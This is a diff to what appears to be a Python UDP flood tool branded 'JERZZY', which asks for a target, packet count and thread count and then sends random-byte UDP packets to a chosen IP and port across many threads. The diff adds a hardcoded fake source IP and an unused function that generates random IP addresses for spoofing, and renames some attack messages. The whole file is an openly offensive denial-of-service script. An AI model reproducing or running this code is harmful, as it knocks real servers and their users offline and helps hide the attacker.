@@ -26,6 +26,7 @@ choice = str(input("Ddos?(y/n):"))
 times = int(input(" Packets :"))
 threads = int(input(" Threads :"))
 os.system("clear")
+fake_ip = '182.21.20.39'
 def run():
 	data = random._urandom(65535)
 	i = random.choice(("[+]","[-]"))
@@ -37,7 +38,7 @@ def run():
 				s.sendto(data,addr)
 			print(i +" JERZZY ATTACKED IP%s AND THROUGH THE PORT%s"%(ip,port))
 		except:
-			print("[!] ERROR SERVER TIME OUT")
+			print("[!] JERZZY - ERROR SERVER TIME OUT")
 
 def run2():
 	data = random._urandom(18)
@@ -52,7 +53,7 @@ def run2():
 			print(i +" JERZZY ATTACKED IP%s AND THROUGH THE PORT%s"%(ip,port))
 		except:
 			s.close()
-			print("[-] ATTACK")
+			print("[*] ATTACK")
             
 for y in range(threads):
 	if choice == 'y':
@@ -61,3 +62,15 @@ for y in range(threads):
 	else:
 		th = threading.Thread(target = run2)
 		th.start()
+
+
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return assemebled
+
